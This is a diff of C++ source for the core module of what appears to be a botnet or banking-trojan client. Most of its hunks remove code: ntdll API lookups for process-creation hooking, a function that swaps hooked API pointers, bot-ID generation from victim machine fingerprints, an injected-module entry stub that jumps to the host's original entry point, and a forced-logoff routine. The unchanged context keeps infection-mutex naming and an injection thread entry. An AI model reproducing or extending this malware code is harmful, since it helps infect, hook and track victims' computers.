@@ -149,50 +149,8 @@ static bool __inline initLoadModules(DWORD flags)
 	}
 	else
 	{
-		//coreData.modules.current - updated rodetelem.
-
 		//Update imports.
 		if(!PeImage::_loadImport(coreData.modules.current, __GetProcAddress(coreData.modules.kernel32, "LoadLibraryA"), __GetProcAddress(coreData.modules.kernel32, "GetProcAddress")))return false;
-	}
-
-
-  //Mapping ntdll.dll and the desired functions.
-  {
-    {
-			if((coreData.modules.ntdll = CWA(kernel32, GetModuleHandleW)(L"ntdll.dll")) == NULL)return false;
-    }
-
-		coreData.ntdllApi.ntCreateThread            = (ntdllNtCreateThread)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateThread");
-		coreData.ntdllApi.ntCreateUserProcess       = (ntdllNtCreateUserProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateUserProcess");
-		coreData.ntdllApi.ntQueryInformationProcess = (ntdllNtQueryInformationProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryInformationProcess");
-		coreData.ntdllApi.rtlUserThreadStart        = (void *)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "RtlUserThreadStart");
-#   if(0)
-		coreData.ntdllApi.ntQueryDirectoryFile      = (ntdllNtQueryDirectoryFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryDirectoryFile");
-#   endif
-#   if defined(HOOKER_LDRLOADDLL)
-		coreData.ntdllApi.ldrLoadDll                = (ntdllLdrLoadDll)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrLoadDll");
-		coreData.ntdllApi.ldrGetDllHandle           = (ntdllLdrGetDllHandle)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrGetDllHandle");
-#   endif
-#   if defined(HOOKER_NTCREATEFILE)
-		coreData.ntdllApi.ntCreateFile              = (ntdllNtCreateFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateFile");
-#   endif
-
-		if((coreData.ntdllApi.ntCreateThread == NULL && coreData.ntdllApi.ntCreateUserProcess == NULL)
-			|| coreData.ntdllApi.ntQueryInformationProcess == NULL
-#        if(0)
-			|| coreData.ntdllApi.ntQueryDirectoryFile == NULL
-#        endif
-#        if defined(HOOKER_LDRLOADDLL)
-			|| coreData.ntdllApi.ldrLoadDll == NULL
-			|| coreData.ntdllApi.ldrGetDllHandle == NULL
-#        endif
-#        if defined(HOOKER_NTCREATEFILE)
-			|| coreData.ntdllApi.ntCreateFile == NULL
-#        endif
-			)
-		{
-			return false;
-		}
 	}
 
 	return true;
@@ -292,10 +250,6 @@ static bool __inline initHandles(DWORD flags)
 			WDEBUG0(WDDT_ERROR, "Failed to create global handles.");
 			return false;
 		}
-	}
-	else
-	{
-		//Created rodielskim flow.
 	}
 
 	return true;
@@ -529,10 +483,8 @@ bool Core::init(DWORD flags)
     LPWSTR userSid;
 		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
 		userSid = NULL;
-    BASECONFIG baseConfig;
-    getBaseConfig(&baseConfig);
 
-    WDEBUG11(WDDT_INFO, "Initialized successfully:\r\nVersion: %u.%u.%u.%u\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\nbaseConfig hash=0x%08X",
+    WDEBUG10(WDDT_INFO, "Initialized successfully:\r\nVersion: %u.%u.%u.%u\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\n",
                        VERSION_MAJOR(BO_CLIENT_VERSION),
                        VERSION_MINOR(BO_CLIENT_VERSION),
                        VERSION_SUBMINOR(BO_CLIENT_VERSION),
@@ -542,8 +494,7 @@ bool Core::init(DWORD flags)
                        coreData.paths.process,
                        CWA(kernel32, GetCommandLineW)(),
                        coreData.paths.home,
-                       userSid == NULL ? L"-" : userSid,
-                       Crypt::crc32Hash((LPBYTE)&baseConfig, sizeof(BASECONFIG)));
+                       userSid == NULL ? L"-" : userSid);
 
     if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
   }
@@ -552,45 +503,14 @@ bool Core::init(DWORD flags)
   return true;
 }
 
-void Core::uninit(void)
-{
-}
-
-void Core::initHttpUserAgent(void)
-{
-  
-}
-
-void Core::initDefaultCallUrlData(Wininet::CALLURLDATA *cud)
-{
-  
-}
-
 HANDLE Core::createMutexOfProcess(DWORD pid)
 {
-  WCHAR objectName[50];
-  BASECONFIG baseConfig;
-  PESETTINGS pes;
+	WCHAR objectName[50];
+	BASECONFIG baseConfig;
+	PESETTINGS pes;
 
-  getBaseConfig(&baseConfig);
-  getPeSettings(&pes);
-
-  MalwareTools::_generateKernelObjectName(&coreData.osGuid, pes.processInfecionId, pid, objectName, &baseConfig.baseKey, MalwareTools::KON_GLOBAL);
-  return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
-}
-
-void Core::generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace)
-{
-  BASECONFIG baseConfig;
-  getBaseConfig(&baseConfig);
-  MalwareTools::_generateKernelObjectName(&coreData.osGuid, id, coreData.currentUser.id, buffer, &baseConfig.baseKey, objectNamespace);
-}
-
-HANDLE Core::waitForMutexOfObject(DWORD id, BYTE objectNamespace)
-{
-  WCHAR strObject[50];
-  Core::generateObjectName(id, strObject, objectNamespace);
-  return  Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, strObject);
+	MalwareTools::_generateKernelObjectName(&coreData.osGuid, pes.processInfecionId, pid, objectName, &baseConfig.baseKey, MalwareTools::KON_GLOBAL);
+	return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
 }
 
 void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags)
@@ -677,121 +597,6 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
   return image;
 }
 
-DWORD Core::disableErrorMessages(void)
-{
-#if(BO_DEBUG == 0)
-  return CWA(kernel32, SetErrorMode)(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
-#else
-  return 0;
-#endif
-}
-
-void Core::replaceFunction(const void *oldFunction, const void *newFunction)
-{
-  void **list = (void **)&coreData.ntdllApi;
-  for(DWORD i = 0; i < sizeof(coreData.ntdllApi) / sizeof(void *); i++)if(list[i] == (void *)oldFunction)list[i] = (void *)newFunction;
-}
-
-bool Core::isActive(void)
-{
-  return CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 0) == WAIT_OBJECT_0 ? false : true;
-}
-
-
-void Core::_generateBotId(LPWSTR buf)
-{
-	WCHAR cid[40];
-	DWORD subId[2];
-
-	//Obtain NetBIOS.
-	int size = sizeof(cid) / sizeof(WCHAR);
-	if(CWA(kernel32, GetComputerNameW)(cid, (LPDWORD)&size) == FALSE)
-		Str::_CopyW(cid, L"N/A", -1);
-
-	//Obtain version. Here, a strong paranoia about the Mem:: _zero ().
-	OSVERSIONINFOEXW ovi;
-	Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
-	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
-	if(CWA(kernel32, GetVersionExW)((OSVERSIONINFOW *)&ovi) == FALSE)Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
-	else Mem::_zero(ovi.szCSDVersion, sizeof(ovi.szCSDVersion));
-
-	{
-		WCHAR regKey[]=L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
-
-		//Date of installation.
-		{
-			WCHAR regValue1[]=L"InstallDate";
-			subId[0] = Registry::_getValueAsDword(HKEY_LOCAL_MACHINE, regKey, regValue1);
-		}
-
-		//Registration data.
-		{
-			WCHAR regValue2[]=L"DigitalProductId";
-			subId[1] = Registry::_getsCrc32OfValue(HKEY_LOCAL_MACHINE, regKey, regValue2);
-		}
-	}
-
-	//Create a full ID
-	{
-		WCHAR format[]=L"%s_%08X%08X";
-		size = Str::_sprintfW(buf, 60, format, cid, Crypt::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Crypt::crc32Hash((LPBYTE)subId, sizeof(subId)));
-	}
-
-	if(size < 1)Str::_CopyW(buf, L"fatal_error", -1);
-}
-
-void Core::getBaseConfig(BASECONFIG *bc)
-{
-}
-
-void Core::getPeSettings(PESETTINGS *ps)
-{
-}
-
-void Core::getPeSettingsPath(DWORD type, LPWSTR path)
-{
-}
-
-void Core::getRegistryValue(DWORD type, LPWSTR key, LPWSTR value)
-{
-}
-
-void Core::getCurrentBotnetName(LPWSTR name)
-{
-}
-
-void *Core::getBaseOverlay(const void *mem, LPDWORD size)
-{  
-  
-  return NULL;
-}
-
-bool Core::setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize)
-{
-	return true;
-}
-
-void Core::createServices(bool waitStop)
-{
-  
-}
-
-static void destoyUserNow(void)
-{
-  CWA(user32, ExitWindowsEx)(EWX_LOGOFF | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
-}
-
-bool Core::destroyUser(void)
-{
-  //FIXME: To read, to think.
-  
-  return false;
-}
-
-bool Core::showInfoBox(BYTE type)
-{
-  return true;
-}
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 // entry point.
@@ -871,45 +676,8 @@ static bool defaultModuleEntry(void)
 	return true;
 }
 
-int WINAPI Core::_injectEntryForModuleEntry(void)
-{
-  if(defaultModuleEntry())
-  {
-    //Calculate the entry point. Deliberately do not check the readability indexes.
-		HANDLE mainModule = CWA(kernel32, GetModuleHandleW)(NULL);
-    if(((PIMAGE_DOS_HEADER)mainModule)->e_magic == IMAGE_DOS_SIGNATURE)
-    {
-      PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)mainModule + ((PIMAGE_DOS_HEADER)mainModule)->e_lfanew);
-      if(ntHeaders->Signature == IMAGE_NT_SIGNATURE)
-      {
-        LPBYTE entry = ntHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)mainModule;
-        return ((PROC)entry)();
-      }
-    }
-    WDEBUG0(WDDT_ERROR, "Failed to get original entry point.");
-  }
-
-  return 0;
-}
-
 DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
 {
   defaultModuleEntry();
   return 0;
 }
-
-/*
-  Launching process as bot, depending: in overlay mode, installer or boot mode.
-
-  IN forceUpdate  - force an update regardless of the version (only for the installer).
-  IN removeItself - auto remove after completion of the process (for the installer).
-
-  Return          - true - in case of success,
-                    false - in case of error.
-*/
-static bool runAsBot(bool forceUpdate, bool removeItself)
-{
-
-  return true;
-}
-
